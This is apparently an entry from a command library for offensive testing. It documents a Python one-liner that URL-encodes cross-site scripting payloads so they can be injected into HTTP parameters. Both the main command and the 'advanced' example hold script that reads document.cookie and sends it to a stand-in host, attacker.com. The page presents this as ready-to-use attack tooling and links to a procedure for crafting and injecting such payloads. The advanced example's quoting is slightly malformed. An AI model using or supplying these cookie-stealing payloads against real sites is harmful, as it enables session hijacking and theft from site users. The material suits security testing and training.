---
data: >-
  python3 -c "import urllib.parse;
  print(urllib.parse.quote('<script>fetch('http://attacker.com/steal?data=' +
  btoa(document.cookie))</script>'))"
tags:
  - xss
  - encoding
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 7feab1aa-bb8a-4b71-b77b-2c818bb4fc1b
created_at: '2025-12-14T03:15:35.600Z'
updated_at: '2025-12-14T03:15:35.600Z'
verified: false
validated: true
submitted: true
---
# encode-xss-payload

## Command

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>fetch(\'http://attacker.com/steal?data=\' + btoa(document.cookie))</script>'))"
```

## Description

This Python one-liner URL-encodes an XSS payload to make it safe for injection into HTTP parameters without breaking the request syntax.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `urllib.parse.quote` | Encodes the string | Yes |
| Payload string | The JavaScript to encode | Yes |

## Examples

### Basic Usage

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))"
```

### Advanced Usage

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('<img src=x onerror=fetch(\'http://attacker.com?cookie=\' + document.cookie)>)')"
```

## Expected Output

Encoded string like %3Cscript%3Ealert%281%29%3C%2Fscript%3E, ready for use in URLs.

## Related

- [[commands/curl-xss-test]]
- [[procedures/Craft-and-Inject-XSS-Payload]]
